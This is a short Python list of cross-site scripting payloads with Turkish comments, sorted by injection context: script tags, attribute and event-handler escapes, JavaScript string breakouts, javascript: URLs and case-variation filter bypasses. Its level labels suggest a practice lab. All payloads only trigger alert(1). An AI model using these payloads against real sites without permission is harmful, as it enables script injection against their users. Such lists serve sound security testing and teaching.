# Çeşitli XSS bağlamlarını hedefleyen payload listesi
XSS_PAYLOADS = [
    # 1. Temel Payload (Filtresiz Yansıma)
    "<script>alert(1)</script>",
    "<Script>alert(1)</sCript>",

    # 2. HTML Nitelik (Attribute) Kaçışı (Level 3)
    # img etiketi ile on* olayları
    '<img src=x onerror=alert(1)>',
    'x" onmouseover="alert(1)"',
    "x' onerror='alert(1)'",
    '"><svg onload=alert(1)>',

    # 3. JavaScript Bağlamından Çıkış (Level 4)
    # Tırnak/Parantez Kapatma ve Yorumlama
    "'); alert(1)//",  # startTimer('...payload...') gibi yerler için
    "'); alert(1); var x='",

    # 4. JavaScript Bloğunu Kapatma (Level 4'ün alternatifi)
    "'</script><script>alert(1)</script>",

    # 5. Protokol İşleyici Kaçışı (Level 5)
    # href veya src nitelikleri için
    "javascript:alert(1)",
    "JaVaScRipT:alert(1)", # Büyük/küçük harf bypass'ı

    # 6. HTML Etiket Kapatma (Input alanlarından çıkış)
    '"><input type="hidden" onfocus="alert(1)" autofocus>',
]